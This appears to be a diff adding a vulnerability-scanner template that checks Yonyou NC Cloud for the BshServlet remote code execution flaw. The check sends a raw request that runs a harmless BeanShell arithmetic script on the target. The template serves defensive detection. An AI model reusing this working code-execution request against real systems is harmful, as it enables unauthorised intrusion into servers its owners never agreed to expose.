@@ -1,0 +1,32 @@
+id: yonyou-nc-cloud-rce-cnvd-2021-30167
+info:
+  name: Yonyou NC Cloud RCE CNVD-2021-30167
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects a remote code execution vulnerability in Yonyou NC Cloud through the BshServlet interface.
+  tags: rce
+
+variables:
+  r1: "{{rand_int(40000, 44800)}}"
+  r2: "{{rand_int(40000, 44800)}}"
+  expected_result: "{{to_number(r1) * to_number(r2)}}"
+
+http:
+  - raw:
+      - |
+        POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        bsh.script=print%28{{r1}}*{{r2}}%29&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{expected_result}}"
+        part: body
